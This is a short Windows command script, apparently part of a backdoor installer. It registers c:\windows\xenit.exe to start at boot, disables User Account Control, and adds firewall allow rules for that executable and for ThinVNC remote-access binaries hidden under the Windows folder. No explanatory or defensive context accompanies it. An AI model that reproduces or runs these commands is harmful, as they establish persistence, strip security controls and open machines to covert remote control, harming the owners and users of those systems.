reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v xenit /t REG_SZ /d c:\\windows\\xenit.exe /f
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="xenit" dir=in action=allow program="c:\\windows\\xenit.exe" enable=yes
netsh advfirewall firewall add rule name="xenit" dir=out action=allow program="c:\\windows\\xenit.exe" enable=yes
netsh advfirewall firewall add rule name="thinvncc" dir=in action=allow program="c:\\windows\\thin_con\\thinvnc.exe" enable=yes
netsh advfirewall firewall add rule name="thinvncc" dir=out action=allow program="c:\\windows\\thin_con\\thinvnc.exe" enable=yes
netsh advfirewall firewall add rule name="thinvncv" dir=in action=allow program="c:\\windows\\thin_view\\thinvnc.exe" enable=yes
netsh advfirewall firewall add rule name="thinvncv" dir=out action=allow program="c:\\windows\\thin_view\\thinvnc.exe" enable=yes
